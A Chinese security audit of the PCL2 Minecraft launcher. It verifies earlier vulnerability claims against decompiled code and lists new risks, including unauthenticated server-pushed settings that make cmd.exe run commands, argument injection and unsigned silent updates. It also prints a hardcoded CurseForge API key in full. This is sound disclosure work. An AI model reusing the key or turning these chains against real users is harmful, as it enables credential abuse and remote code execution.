# PCL2 启动器（v2.13.0.1）反汇编核验报告
## —— 对《ModSecret 安全评估报告》16 项结论的逐条验证及新增风险清单

> **样本**：`Plain Craft Launcher 2.exe`，5,645,824 字节，PE32 / .NET Framework 4.8，`AssemblyVersion 2.13.0.1`（VersionCode 406，Release 分支）
> **核验对象**：`安全评估报告_ModSecret.md`（16 项）、`漏洞原理教程_ModSecret.md`（8 条攻击链）
> **方法**：全量反汇编 + 内嵌依赖程序集提取 + 针对性运行时行为验证
> **日期**：2026-10-25

---

## 0. 三个问题的直接回答

### （1）md 中的漏洞存在吗？

**16 项中：7 项成立（其中 2 项比原文判断更严重），4 项部分成立（机制描述有误但风险实质存在），3 项不成立（核心技术假设被二进制否定），2 项降级。**

| 判定 | 数量 | 编号 |
|---|---|---|
| ✅ 成立 | 7 | PCL-RCE-001、PCL-RCE-003、PCL-SILENT-001、PCL-DL-001、PCL-DOS-001、PCL-PARSE-001、PCL-INFO-002 |
| ⚠️ 部分成立（结论对、机制错） | 4 | PCL-RCE-002、PCL-PARSE-002、PCL-FILE-001、PCL-INFO-003 |
| ❌ 不成立 | 3 | **PCL-INFO-001**、**PCL-MITM-001**、**PCL-CHAIN-001** |
| 🔽 降级 | 2 | PCL-HARD-001（成立但属设计风险）、PCL-LOG-001（成立但泄露面需修正） |

一句话概括：**"服务器可远程指挥客户端"这一根因完全成立且证据确凿；但原文中三条"由此推出 RCE/追踪/中间人"的关键推断链（设备指纹外发、TLS 被禁用、`{CDN}` 受设置控制）在 v2.13 二进制中均被证伪。**

### （2）哪里做了修补/原本就不存在？

原文中 5 处"高置信度推断"经核验为**不存在或已加固**，共涉及 4 类防御：

1. **`{CDN}` 不是可配置的域名占位符，而是 URL 签名参数**（`SecretCdnSign`）—— PCL-CHAIN-001 的攻击链不存在。
2. **TLS 证书校验默认开启，且 IP 直连场景下仍按 Host 头校验证书**（已用 .NET Framework 4.8 正/反用例实测）—— PCL-MITM-001 的前置条件不成立。
3. **`Settings.Set` 有键名白名单 + 强制类型转换**（`Entries` 字典，未注册键抛 `KeyNotFoundException`）—— PCL-RCE-002 的"任意设置写入"机制不成立。
4. **ZIP 解压具备路径穿越防护**（`PathUtils.IsParentOf` + `Path.GetFullPath`）、**`OpenWebsite` 有协议白名单**、**`--update` 参数只取文件名并锚定启动器目录**——原文担心的 ZIP-slip / `file://` / 任意路径写入均不可行。

### （3）还有哪些其他高危/中危漏洞？

反汇编额外确认 **8 项**原文未覆盖的问题，其中 3 项高危、3 项中危：

| 编号 | 问题 | 严重度 | 前置条件 |
|---|---|---|---|
| PCL2-2026-01 | `setup` → `LaunchAdvanceRun` → `cmd.exe /c`：持久化命令执行（白名单本身含执行类设置） | 🔴 高 | 一次公告投递 |
| PCL2-2026-02 | `ServerConfig["Link"]["Argument"]` 直接拼入 `联机模块.exe` 命令行（配置驱动参数注入） | 🔴 高 | ServerConfig 可控 |
| PCL2-2026-03 | 静默更新默认可用（`HasUpdatePermission => true` 硬编码），更新包仅校验"≥1MB" | 🔴 高 | ServerConfig 可控 |
| PCL2-2026-04 | `SystemSystemCache` 可由 `setup` 改写 → 缓存/更新包落盘目录可控 | 🟠 中 | 一次公告投递 |
| PCL2-2026-05 | 硬编码 CurseForge API Key（Base64 明文，`x-api-key`） | 🟠 中 | 无 |
| PCL2-2026-06 | 凭据以 DES-CBC（固定 IV、密钥=`"PCL"+Identify`）存储，且 Identify 明文入日志 | 🟠 中 | 本机/日志获取 |
| PCL2-2026-07 | 隐藏设置 `ToolDownloadCert` 可安装进程级"接受任意证书"回调（语义反转） | 🟡 中低 | setup 写入 |
| PCL2-2026-08 | 低版本 Windows 下 `SecurityProtocol` 硬编码含 `Ssl3` | 🟡 低 | 目标系统 < Win8 |

---

## 1. 分析方法与可复现证据链

### 1.1 工具链（外部下载，自行构建弃用）

| 环节 | 工具 | 说明 |
|---|---|---|
| 运行时 | .NET SDK 8.0.426（`dotnet-install.ps1`，便携安装至 `re_work/dotnet`） | 仅为运行 ilspycmd |
| 反编译 | `ilspycmd 9.0.0.7889`（ILSpy 官方 CLI） | 全量输出 88,510 行 C# |
| 依赖还原 | 自 PE 镜像中定位 13 个内嵌 IL 程序集并提取 | PCL 通过 `AssemblyResolve` + `PCL.Resources.resources` 动态加载 |
| 运行时验证 | PowerShell 5.1（.NET Framework 4.8 栈） | 验证 TLS 校验基准 |

### 1.2 样本特征（排除加壳/混淆）

```
section   VA         VSize     RawSize   RawPtr
.text     0x00002000 0x005301a8 0x00530200 0x000200
.rsrc     0x00534000 0x00031fb4 0x00032000 0x00530400
.reloc    0x00566000 0x0000000c 0x00000200 0x00562400
```

- 单一 `.text` 承载全部 IL，**无壳、无名称混淆**：`ModSecret`、`ServerSub`、`HasUpdatePermission`、`UpdateStart` 等符号均以原名保留。
- 共 **501 个类型**；`PCL.ModSecret` 为 VB 标准模块（1632 行反编译代码），即公开源码中"联网配置"所在类型。
- 反编译残留源码路径常量 `F:\Projects\Plain Craft Launcher 2\本体代码\...\ModSecret.vb`，**方法级归属可一一对应到公开源码**，这是本次核验最强的证据：日志字符串是编译期常量，无法伪造。

### 1.3 内嵌依赖程序集（反编译后可完整审查"外部符号"）

| 偏移 | 程序集 | 大小 |
|---|---|---|
| 0x225f56 / 0x22f15b / 0x231760 | CacheCow.Client / .FileStore / .Common | 37K / 9K / 13K |
| 0x24f9c6 | Imazen.WebP | 18K |
| **0x25aa0b** | **MeloongCore**（`FileUtils`/`MsDelta`/`FileChecker`/`CryptographyUtils`） | 137K |
| 0x27c410 | MeloongCore.Wpf | 34K |
| 0x284a15 / 0x2f7a1a | NAudio / Newtonsoft.Json | 471K / 700K |
| 0x3a572f | Ookii.Dialogs.Wpf | 105K |
| **0x3bf334** | **PCLCS**（`JavaUtils`/`Configs`/`Resource`） | 825K |
| 0x488939 / 0x4b471e | System.Net.Http.Formatting / ThrottleDebounce | 169K / 46K |

> 原文把 `FileUtils.ExtractToDirectory`、`UpdateStart`、`NetRequestByClientRetry` 等列为"不可见的外部符号"。本节起，这些全部可见——**这是原文多处推断失准的根本原因**。

---

## 2. 逐条核验

### 2.1 PCL-RCE-001 无约束的服务器动作执行通道 — ✅ **成立**

反编译的 `ModSecret.ServerSub` 动作分发与公开源码逐字对应（仅变量名不同）：

```csharp
foreach (JProperty item3 in (IEnumerable)obj) {          // obj = 公告/按钮的 actions
  JProperty val4 = item3;
  try {
    switch (val4.Name) {
      case "copy":          ModBase.ClipboardSet(val4.Value.ToString()); break;
      case "website":       ModBase.OpenWebsite(val4.Value.ToString()); break;
      case "stop":          ModMain.FrmMain.EndProgram(SendWarning: false); break;
      case "setup": { JObject val5 = (JObject)val4.Value;
                      foreach (KeyValuePair<string, JToken> item4 in val5)
                          Settings.Set(item4.Key, item4.Value.ToString()); break; }
      case "update":
      case "slientupdate": { _ = (JObject)val4.Value;
                             bool flag3 = Operators.CompareString(val4.Name, "slientupdate", TextCompare: false) == 0;
                             if (!HasUpdatePermission) { if (!flag3) InputPotatoCode(IsUpdating: true);
                                                         if (!HasUpdatePermission) break; }
                             UpdateStart(flag3); break; }
      default: throw new Exception("未知的行动支：" + val4.Name + ", " + val4.Value.ToString());
    }
  } catch (Exception ex15) { Logger.Error(...); }
}
```

**核验结论**：
- 动作集合、参数透传、异常吞掉、`Case Else` 抛错四点与原文完全一致。
- **整条链上不存在任何内容鉴权。** 全程序集唯一的签名校验是"土豆码"功能（`CryptographyUtils.EcdsaVerify`，`ModSecret.InputPotatoCode` 内），与公告/配置/更新包无关。`ServerConfig.json`、`notice.json`、`notice.cfg`、更新 ZIP 均无哈希、无签名、无证书固定。
- **修正**：原文称此通道"等价于无鉴权命令解释器"，方向正确，但现实前置条件是**攻击者取得 COS 桶写权限，或具备可签发可信证书的链路中间人**——TLS 与证书校验默认是开启的（见 2.7），因此不属于"任意互联网攻击者可远程利用"。

---

### 2.2 PCL-RCE-002 `setup` 无白名单可改写任意设置 — ⚠️ **部分成立（机制错误，实质更严重）**

原文核心论断"没有任何键名白名单、类型校验或安全敏感键拦截"**不成立**：

```csharp
public static void Set(string Key, object Value, ModMinecraft.McInstance Instance = null) {
    Setting value = null;
    if (!Entries.TryGetValue(Key, out value))
        throw new KeyNotFoundException("未找到设置项：" + Key);      // ① 键名白名单（约 190 项）
    Value = RuntimeHelpers.GetObjectValue(
        Conversion.CTypeDynamic(RuntimeHelpers.GetObjectValue(Value), value.Type)); // ② 强制类型转换
    ...
}
```

- ① `Entries` 是 `Dictionary<string, Setting>`，未注册键直接抛异常（被 `setup` 的 catch 吞掉，仅记日志）。因此"写入任意键名"不成立，`JObject` 值也不会污染设置存储（② `CTypeDynamic` 按声明类型转换，失败即异常）。
- 但**白名单是"功能白名单"而非"安全白名单"**，其中包含可直接执行命令的设置项——这才是真实风险（详见 **PCL2-2026-01**）：

| 设置键 | 语义 | 风险 |
|---|---|---|
| `LaunchAdvanceRun` | 启动前自定义命令 | `cmd.exe /c "<值>"` 执行 |
| `LaunchAdvanceJvm` | 追加 JVM 参数 | 可注入 `-javaagent:<jar>` |
| `LaunchAdvanceGame` | 追加游戏参数 | 参数注入 |
| `CacheAuthServerServer` | authlib 登录服务器基址 | 凭据重定向 |
| `SystemSystemCache` | 缓存目录 | 落盘路径可控（PCL2-2026-04） |
| `LoginType` / `LoginNideEmail` / `LoginAuthEmail` | 登录方式与账号 | 登录流程劫持 |

- 另需修正：`Version*` 系列为**实例级**设置（`Sources.Instance`），`setup` 以 `Instance=null` 调用会在 `GetCache` 处触发 `NullReferenceException` 并被捕获，**无法写入实例级设置**。

---

### 2.3 PCL-RCE-003 不安全的更新机制 — ✅ **成立，且比原文更严重**

三段证据串联：

**(a) 权限门形同虚设**
```csharp
private static bool HasUpdatePermission => true;   // 硬编码常量
```
Release 构建下 `HasUpdatePermission` 恒为 `true`，`InputPotatoCode` 分支为死代码。**`update` 与 `slientupdate` 动作均无需任何用户确认即执行**（非静默分支也只是弹一条 Hint，不是对话框）。

**(b) 更新源来自服务器配置**
```csharp
JObject val = (JObject)ServerConfig["Update"][(object)ModBase.BuildTypes.Release.ToString()];
if (val.ContainsKey("PatchUrls") && StringExtensions.StartsWithF(UpdateMark, "Empty", false))
    urls = val["PatchUrls"].ToObject<List<string>>();
else if (val.ContainsKey("DownloadUrls"))
    urls = val["DownloadUrls"].ToObject<List<string>>();
...
Task.Output = new ModNet.NetFile[1] { new ModNet.NetFile(urls, localPath) };  // 未传 FileChecker
```
`NetFile` 未携带 `FileChecker`（无哈希），`hasUpdatePermission` 无校验。

**(c) 落地执行：直接覆盖可执行文件**
```csharp
string exePath = Paths.Base + "PCL\\Plain Craft Launcher 2.exe";
if (FileUtils.Exists(exePath)) FileUtils.Delete(exePath, false);       // 先删旧 exe
if (Extension == ".zip") FileUtils.ExtractToDirectory(localPath, Paths.Base + "PCL\\", null);
else MsDelta.Apply(ModBase.PathExe, localPath, Paths.Base + "PCL\\Plain Craft Launcher 2.exe"); // 打补丁
...
UpdateRestart(TriggerRestartAndByEnd: true);   // 启动新 exe
```

**核验结论**：
- 更新链**无哈希、无签名、无 Authenticode 校验**（`MsDelta.Apply` 亦无签名校验），与原文判断一致。
- **原文推断有误**：`PCL\update.exe` 在本版**只被删除、从未被执行**（全程序集仅 2 处引用，均为 `Delete`）。当前更新方式是"ZIP 覆盖 + 重启新 exe"，比"下载独立更新器再执行"更直接——原文"update.exe 是执行入口"的语义需整体替换。
- 另一条同类路径：`DownloadLatestPCL` 从 `ServerConfig["Update"]["Release"]["DownloadUrls"]` 下载 `Latest.zip`，解压后把 exe 存为 `Latest.exe`，校验仅为 `new FileChecker { MinSize = 1048576 }`——**只校验"不小于 1MB"**。

---

### 2.4 PCL-SILENT-001 无 `buttons` 公告静默执行 — ✅ **成立**

```csharp
JArray val3 = (JArray)(((object)val["buttons"]) ?? ((object)new JArray()));
int count = ((JContainer)val3).Count;
if (count > 0) { ... num9 = MyMsgBox(...); obj = val3[num9 - 1]["actions"] ?? ...; }
else          { obj = val["actions"] ?? ...; }        // 无按钮 → 直接取顶层 actions
foreach (JProperty item3 in (IEnumerable)obj) { ... } // 无任何确认
```
与原文一致。补充：`count > 3` 时 `continue`，即**超过 3 个按钮的公告被整体跳过**（原文未提，可用于"反制"——服务器无法用 4 按钮公告绕过限制，因为会被跳过而非降级）。

---

### 2.5 PCL-DL-001 下载内容无完整性校验 — ✅ **成立**

| 资源 | 校验方式 | 结论 |
|---|---|---|
| `notice.cfg` | 无 | 未校验 |
| `ServerConfig.json` | 无（下载后直接 `ReadAsJson`） | 未校验 |
| `notice.json` | 仅 `RequireJson`（首尾字符为 `{`/`[`） | 格式校验，非完整性 |
| `minecraft/download.json` | 仅 `RequireJson` | 同上 |
| 更新 ZIP / 补丁 | 无 | 未校验 |
| `Latest.zip` | `MinSize = 1MB` | 仅尺寸下限 |
| 本地缓存 `Cache\ServerConfig.json` | 仅 `Val(ServerConfig["Version"])` | 未校验 |

**关键对照**：框架层其实**具备**完整性校验能力——`MeloongCore.FileChecker` 支持按哈希长度自动选择 MD5/SHA1/SHA256：
```csharp
case 32: ... ComputeFileHash(localPath) ...   // 32→MD5，40→SHA1，64→SHA256
```
但更新链与公告链**一律没有传入 `Hash`**。这属于"能力已具备却未启用"，是修复成本最低的一类问题。

---

### 2.6 PCL-DOS-001 `stop` 动作远程拒绝服务 — ✅ **成立（中危偏低）**

`ModMain.FrmMain.EndProgram(SendWarning: false)`：`SendWarning=false` 时跳过"还有下载任务"确认，直接进入退出流程。危害仅限可用性，且与 PCL-SILENT-001 组合才有意义。

---

### 2.7 PCL-MITM-001 传输层校验未知（可能禁用 TLS） — ❌ **不成立**

原文假设"开发者常设置 `ServerCertificateValidationCallback = ... True`"，实测三步否定：

**(a) 请求客户端未设置自定义校验回调**
```csharp
RequestClient = ClientExtensions.CreateClient(
    (ICacheStore)new FileStore(ModBase.PathTemp + "Cache/Http/"),
    (HttpMessageHandler)new HttpClientHandler {
        AutomaticDecompression = (DecompressionMethods.GZip | DecompressionMethods.Deflate),
        UseCookies = false
    });
```
`HttpClientHandler` 无 `ServerCertificateCustomValidationCallback`，走 .NET 默认校验。

**(b) 进程级回调存在，但仅在特定条件下放宽，且默认不安装**
```csharp
public static void ShouldValidateSslCertificateOnLogin(bool Enabled) {
    ServicePointManager.ServerCertificateValidationCallback = (Sender, Certificate, Chain, Failure) => {
        HttpWebRequest req = Sender as HttpWebRequest;
        if (Failure == SslPolicyErrors.None) return true;
        Logger.Warn($"未通过 SSL 证书验证（{Failure}），提供的证书为 {Certificate?.Subject}，URL：{req?.Address}");
        if (req == null) return !Enabled;
        return (req.Address.Host.Contains("xboxlive") || req.Address.Host.Contains("minecraftservices")) && !Enabled;
    };
}
```
唯一调用点是设置项 `ToolDownloadCert` 的变更回调：
```csharp
new Setting("ToolDownloadCert", false, Sources.Registry, Encrypted: false,
            (object a0) => ModNet.ShouldValidateSslCertificateOnLogin(Conversions.ToBoolean(a0)));
```
`Setting` 构造函数**不调用** `OnChanged`，`Settings.Get` 也不调用——因此默认运行期该回调根本未安装；只有在 `ToolDownloadCert` 被**显式写入**时才安装。（该设置全程序集除定义外无任何引用，即**无 UI、无默认写入**，只能由 `setup` 动作写入 → 见 PCL2-2026-07。）

**(c) IP 直连不会破坏主机名校验（关键实测）**
`ModNet.DNSLookup` 会把请求 URI 改写为字面 IP，并把 `Host` 头设为原域名：
```csharp
Request.Headers.Host = Request.RequestUri.Authority;
Request.RequestUri = new UriBuilder(Request.RequestUri) { Host = iPAddress.ToString() }.Uri;
```
用 .NET Framework 4.8 栈实测（与 PCL 同运行时）：

| 用例 | 结果 |
|---|---|
| `https://104.20.23.154/` + `Host: example.com` | **OK 200** —— 按 Host 头校验证书通过 |
| `https://104.20.23.154/` + `Host: wrong-name.example` | **失败**：`未能创建 SSL/TLS 安全通道` —— 校验确实生效 |

**结论**：v2.13 的 PCL 对自有服务器（`file.myqcloud.com`）的 HTTPS 具备真实的证书 + 主机名校验，原文"MITM 前置条件已具备"的判断错误。

> 但本节发现一个**新的**中低危问题：该回调一旦被安装，对 `xboxlive` / `minecraftservices` 域**接受任意证书错误**，而这两个域正是微软账号令牌交换端点——见 PCL2-2026-07。

---

### 2.8 PCL-INFO-001 设备指纹外发 — ❌ **不成立（核心论断错误）**

原文推断"`Identify` 极可能以 `?v=版本&id=Identify` 随每次 HTTPS 请求外发"。逐符号核查结果：

| 事实 | 证据 |
|---|---|
| `Identify` 的构成 | `GetStableHashCode(HKLM\SYSTEM\HardwareConfig\LastConfig + Settings["Identify"]) → 16 位十六进制`，格式化为 `XXXX-XXXX-XXXX-XXXX`（硬件派生） |
| **是否拼入请求 URL** | **否**。`ModNet` 全链路唯一追加的参数是 `SecretCdnSign` 生成的 `?sign=时间戳-随机-0-MD5`；全程序集不存在 `?id=` / `&id=` 形式的 URL 构造 |
| `{UNIQUE}` 替换 | `text5.Replace("{UNIQUE}", ModBase.Identify)` —— 方向是**服务器→客户端**的模板填充，不产生上行 |
| `{identify}` 替换 | 仅用于本地自定义命令/参数的 `ArgumentReplace`，不外发 |
| 实际外发路径 | 联机模块把 `Identify` 的哈希压缩为 6 位 `Client-xxxxxx` 作为 EasyTier `--hostname`（对等节点可见，非遥测） |
| 遥测 | `ModMain.Telemetry` 仅上报事件名与业务字段（版本、异常文本），**不含 Identify** |

**结论**：`PCL-INFO-001` 关于"每请求外发设备指纹"的结论不成立。
**但存在两个真实的衍生问题**（另列）：`Identify` 在**每次启动时明文写入日志**（见 PCL2-2026-06），且是凭据加密的密钥材料。

---

### 2.9 PCL-PARSE-001 基于位置的 `Split("|")` 解析 — ✅ **成立**

二进制中的字段位置比原文更完整：

```csharp
text3 = NetRequestByClientRetry(".../notice.cfg{CDN}");
num4 = (int)Math.Round(Val(Split(text3, "|")[0]));   // 公告编号
num5 = (int)Math.Round(Val(Split(text3, "|")[3]));   // download.json 编号（原文未覆盖）
if (num4 == 0) throw new Exception("获取到的内容有误！");
...
double num6 = Val(Split(text3, "|")[4]);             // 配置版本号
```
- 字段不足 5 段时 `[4]` 抛 `IndexOutOfRangeException`，被 `catch` 吞掉 → **配置永不更新**，原文的"隐蔽失效窗口"成立。
- `Val()` 语义与原文一致（首个非数字即停）。

---

### 2.10 PCL-PARSE-002 JSON 反序列化类型混淆 — ⚠️ **部分成立（失效表现需修正）**

```csharp
int  num7 = (int)Math.Round(Val(val["id"] ?? JToken.op_Implicit(0)));
int  num8 = (int)(val["importantLevel"] ?? JToken.op_Implicit(2));   // JToken 显式转换
bool flag2 = (bool)(val["isUpdate"] ?? JToken.op_Implicit(false));
```
- 缺 Schema 校验成立；`Val()`、`JToken` 显式转换的隐式语义成立。
- **修正**：类型异常（如 `importantLevel` 为字符串 `"abc"`）会抛 `FormatException`，被**最外层** `catch` 捕获，后果是 `Logger.Warn(text5)` + 删除 `Notice.json` + **整个公告循环中止**——即"公告系统被整体打断"，而非原文所述"逐条静默跳过"。
- **修正**：`setup` 的"设置类型污染"不成立（`CTypeDynamic` 强转，失败即异常）。

---

### 2.11 PCL-HARD-001 硬编码远端地址 — ✅ **成立（并新增 4 处）**

| 用途 | 地址 |
|---|---|
| 公告编号 | `https://pcl2-server-1253424809.file.myqcloud.com/notice.cfg{CDN}` |
| 服务器配置 | `.../ServerConfig.json{CDN}` |
| 公告内容 | `.../notice.json{CDN}` |
| **特供版清单（新）** | `.../minecraft/download.json{CDN}` |
| **遥测（新）** | `https://ap-shanghai.cls.tencentcs.com/track?topic_id=pcl-remote-1253424809` |
| **联机参数（新）** | 由 `ServerConfig["Link"]["Argument"]` 提供 |
| **微软 OAuth（新）** | `OAuthClientId = fe72edc2-3a6f-4280-90e8-e2beb64ce7e1`（公开标识，非密钥） |

---

### 2.12 PCL-CHAIN-001 `{CDN}` + `setup` 链式 RCE — ❌ **不成立**

`{CDN}` 的真实语义是**URL 签名占位符**，与任何设置项无关：

```csharp
internal static string SecretCdnSign(string UrlWithMark) {
    if (ModBase.ApplicationStartTick < 1) return UrlWithMark;
    if (!EndsWithF(UrlWithMark, "{CDN}", false)) return UrlWithMark;
    string url  = UrlWithMark.Replace("{CDN}", "").Replace(" ", "%20");
    string rand = EnsureLength(RandomInteger(0, 2147483645).ToString("x"), '0', 8);
    string ts   = Conversions.ToString(ModBase.GetUnixTimestampUtc());
    string path = /* url 中 "://" 之后的首个 "/" 起的部分 */;
    string sign = ComputeHash(Join(new[]{ path, ts, rand, "0", "PCL2Server" }, "-"), HashMethod.MD5);
    return url + (url.Contains("?") ? "&" : "?") + "sign=" + Join(new[]{ ts, rand, "0", sign }, "-");
}
```
- `{CDN}` 被替换为 `?sign=...`，**不改变主机名**，`setup` 无法重定向下载域名。
- 该实现本身引入一个独立弱点（PCL2-2026-08 的同类问题）：**共享密钥 `"PCL2Server"` 硬编码、摘要算法为 MD5、签名仅覆盖 path（不含 host）**，任何人可从二进制提取该密钥自行签发合法 URL。

---

### 2.13 PCL-FILE-001 不安全临时文件写入 — ⚠️ **部分成立（降级）**

- 路径确实固定可预测：`PathTemp + "Cache\\ServerConfig.json"`、`...Notice.cfg`、`...Notice.json`，且 `PathTemp` 可由设置 `SystemSystemCache` 指定（见 PCL2-2026-04）。
- **但"任意文件写入"路径已封堵**：
  - ZIP 解压有穿越防护：`if (!PathUtils.IsParentOf(outputDirectory, text2)) throw new InvalidDataException("Zip 文件项 ... 的路径在压缩包之外")`，其中 `PathUtils.IsParentOf` 基于 `Path.GetFullPath` 规范化后按 `\\` 前缀比较，`..\` 无法绕过。
  - 独立于 ZIP 的写入只有固定文件名的覆盖写，符号链接攻击需同用户写权限（不构成权限边界跨越）。

---

### 2.14 PCL-LOG-001 日志含远端原文 — ✅ **成立（泄露面需修正）**

- `Logger.Warn(text5, ...)` 确实把 `notice.json` 原文落盘（解析失败时），`Logger.Info($"本地公告编号：{num2}，服务器公告：{text3}...")` 把 `notice.cfg` 原文落盘。
- **修正**：原文担心的"`{UNIQUE}` 已被替换为真实 Identify"不成立——替换发生在 `DeserializeJson` 的入参上，日志记录的是替换前的 `text5`。
- **但存在更严重的新增泄露**：启动即写 `Logger.Info($"识别码：{ModBase.Identify}")`、`程序路径`、`管理员权限`、更新 URL 列表（见 PCL2-2026-06）。

---

### 2.15 PCL-INFO-002 FIPS 文案误导 — ✅ **成立**

```csharp
if (ex8 is InvalidOperationException && ex8.Message.Contains("FIPS")) {
    MyMsgBox("由于系统未启用 FIPS 兼容算法，PCL 可能无法正常运行。\r\n请按照教程启用该功能，然后重启 PCL。", ...)
    OpenWebsite("https://blog.csdn.net/qq_37608398/article/details/81209922");
}
```
.NET 的 FIPS 异常（`This implementation is not part of the Windows Platform FIPS validated cryptographic algorithms`）发生在**系统启用** FIPS 策略时，文案因果相反。原文判断准确，仅属信息级。

---

### 2.16 PCL-INFO-003 自复制 `Latest.exe` 固化 — ⚠️ **部分成立（机制已变）**

两条路径并存：
```csharp
// ① ServerSub：无更新时把自己复制为"最新正式版"
if (Settings.Get<int>("SystemHighestSavedBetaVersionReg") < 406 || !Exists(PathTemp + "Latest.exe")) {
    Settings.Set("SystemHighestSavedBetaVersionReg", 406);
    FileUtils.Copy(ModBase.PathExe, PathTemp + "Latest.exe");
}
// ② DownloadLatestPCL：从服务器下载 Latest.zip（仅 MinSize 校验）→ 解压 → 取其中的 exe
NetDownloadByLoader(ServerConfig["Update"]["Release"]["DownloadUrls"], PathTemp + "Latest.zip",
                    loader, new FileChecker { MinSize = 1048576 });
ExtractToDirectory(PathTemp + "Latest.zip", PathTemp);
FileUtils.Move(PathTemp + "Plain Craft Launcher 2.exe", PathTemp + "Latest.exe");
```
原文"污染版本被固化为官方缓存"的结论成立，但**现在 `Latest.exe` 还可直接来自服务器下发的 ZIP**，风险比"自复制"更高。

---

## 3. 已被修补 / 原本不存在的能力清单（对应问题 2）

| # | 原文假设 | 二进制事实 | 影响 |
|---|---|---|---|
| 1 | `{CDN}` 可被 `setup` 改写 → 域名重定向 | `{CDN}` → `?sign=ts-rand-0-MD5(path,…)`，与设置无关 | PCL-CHAIN-001 不成立 |
| 2 | 自定义 HTTP 客户端可能 `return true` 接受任意证书 | 无自定义回调；默认校验；IP 直连仍按 Host 头校验（实测正/反用例） | PCL-MITM-001 不成立 |
| 3 | `setup` 可写入任意键名/任意类型 | `Entries` 白名单（未注册键抛 `KeyNotFoundException`）+ `CTypeDynamic` 强转；实例级设置因 `Instance=null` 直接异常 | 机制不成立（但白名单本身有毒，见 NEW-01） |
| 4 | `website` 可能触发 `file://` / UNC | `OpenWebsite` 白名单：仅 `http*`、`minecraft://`、`minecraft-preview://`，否则抛异常并仅复制到剪贴板 | 该子项不成立 |
| 5 | ZIP 解压可路径穿越（更新包/整合包） | `ExtractToDirectory` 逐项 `IsParentOf` 校验，越界抛 `InvalidDataException` | 该子项不成立 |
| 6 | `--update` 命令行可写任意路径 | `UpdateReplace` 只取 `PathUtils.GetLastPart(...)` 并锚定 `Paths.Base` | 任意文件写入不成立 |
| 7 | `update.exe` 是更新器执行入口 | 全程序集仅 2 处引用，均为 `Delete`（清理历史残留）；本版更新=ZIP 覆盖 + 重启 | 需整体替换描述 |
| 8 | `Identify` 随每次请求以 `?id=` 外发 | 仅 `sign=` 参数；无 `id=` 构造 | PCL-INFO-001 不成立 |
| 9 | 日志会泄露真实 Identify（经 `{UNIQUE}` 替换） | 日志记录替换前原文 | 该项不成立（但启动日志另泄，见 NEW-06） |
| 10 | 无本地攻击面提及 | 无 `HttpListener`/`TcpListener`/命名管道；UDP 仅向 `127.0.0.1:4445` 单向下发 MOTD | 无本地服务攻击面 |

---

## 4. 新增高危/中危问题（对应问题 3）

### PCL2-2026-01 `setup` → `LaunchAdvanceRun` → `cmd.exe /c` 持久化命令执行 🔴

**证据**：`setup` 可写 `LaunchAdvanceRun`（`Sources.Normal`，类型 `string`）；启动游戏时：

```csharp
string text = Settings.Get<string>("LaunchAdvanceRun");
if (text != "") text = ModMain.ArgumentReplace(text);
...
process = ModBase.StartProcess(new ProcessStartInfo {
    FileName = "cmd.exe",
    Arguments = $"/c \"{text}\"",
    WorkingDirectory = ModMinecraft.McFolderSelected,
    UseShellExecute = false, CreateNoWindow = true
});
```

**危害**：一次公告即可把任意命令写入 `Setup.ini`，**在用户下次启动游戏时静默执行**，并长期驻留（无需重复投递、无需更新包、无需哈希绕过）。同类：`LaunchAdvanceJvm` 追加 JVM 参数 → `-javaagent:<远程 jar>` 可在游戏进程内执行代码。

**评价**：这是原文 PCL-RCE-002 想要描述的"扳机"，但真正的利用点不是"任意设置"，而是"白名单中合法存在的执行类设置"。

### PCL2-2026-02 `ServerConfig["Link"]["Argument"]` 命令行注入 🔴

```csharp
string text3 = (string)ModSecret.ServerConfig["Link"]["Argument"];
text3 += $" --network-name={NetworkName} --network-secret={NetworkSecret} --listeners {num} ...";
...
new ProcessStartInfo { FileName = PathEasyTier + "联机模块.exe", Arguments = text3,
                       UseShellExecute = false, CreateNoWindow = true, ... }
```

**危害**：服务器配置可向子进程注入任意参数（如 `-c <本地/远端配置>`），改变联机模块的网络行为（监听、转发、代理），构成流量劫持/内网穿透面。`UseShellExecute=false` 限制了 shell 元字符，但**参数级注入**完全成立。

### PCL2-2026-03 静默更新链路默认可用 🔴

- `HasUpdatePermission => true`（硬编码）+ `slientupdate` + 无哈希 + 直接覆盖 exe + 自动重启。
- 与 PCL2-2026-02 共用同一信任根（`ServerConfig.json`），因此对攻击者而言，"一次配置投递"即可完成：**改 `Link.Argument`（即时影响）/ 改 `Update.Release.DownloadUrls`（持久化 RCE）**。
- 补充：更新包校验仅 `MinSize = 1048576`，而 `FileChecker.Hash` 能力现成未用。

### PCL2-2026-04 `SystemSystemCache` 导致落盘目录可控 🟠

```csharp
public static string PathTemp = (Settings.Get<string>("SystemSystemCache") == "" ?
    System.IO.Path.GetTempPath() + "PCL\\" : Settings.Get<string>("SystemSystemCache"))
    .Replace("/","\\").TrimEnd('\\') + "\\";
```
`setup` 可写入该键 → 之后 `Cache\ServerConfig.json`、`Cache\Notice.json`、`Latest.zip`、`Latest.exe`、`Cache\Http\*` 全部落到攻击者指定目录（文件名固定、内容服务器可控）。可用于把"恶意 exe"精确投放到某个期望位置（如用户桌面、启动目录下的固定命名文件），提升社工/持久化成功率。

### PCL2-2026-05 硬编码 CurseForge API Key 🟠

```csharp
if (Url.Contains("api.curseforge.com") || Url.Contains("forgecdn.net"))
    Req.Headers.Add("x-api-key",
        Encoding.Default.GetString(Convert.FromBase64String(
        "JDJhJDEwJDdXV1YxV0VMY3dYOFhwN2Q2OE1Icy41Z3JUeVpWYTZTeW55ZVN5TWgxcnNFODluSWEwOXpP")));
```
Base64 解码即 `$2a$10$7WWV1WELcwX8Xp7d68MHs.5grTyZVa6SynyeSyMh1rsE89nIa09zO`（bcrypt 形态的开发者 API Key）。**任何人可从二进制提取并冒用**，导致配额耗尽、按 Key 计费损失、以及平台侧封禁后**全体 PCL 用户下载功能失效**（单点失效）。

### PCL2-2026-06 凭据弱加密 + 识别码入日志 🟠

```csharp
// 保存：DES-CBC，密钥 = 8 位 GetStableHashCode("PCL" + Identify)，IV 为固定常量
text = DesEncrypt(text, "PCL" + ModBase.Identify);

// 加密项
new Setting("CacheMsAccess",   "", Sources.Registry, Encrypted: true),
new Setting("CacheNidePass",   "", Sources.Registry, Encrypted: true),
new Setting("CacheAuthPass",   "", Sources.Registry, Encrypted: true),
new Setting("LoginNidePass",   "", Sources.Registry, Encrypted: true),
new Setting("LoginAuthPass",   "", Sources.Registry, Encrypted: true),

// 启动日志（Application.xaml.vb）
Logger.Info($"识别码：{ModBase.Identify}");
Logger.Info($"程序路径：{ModBase.PathExe}");
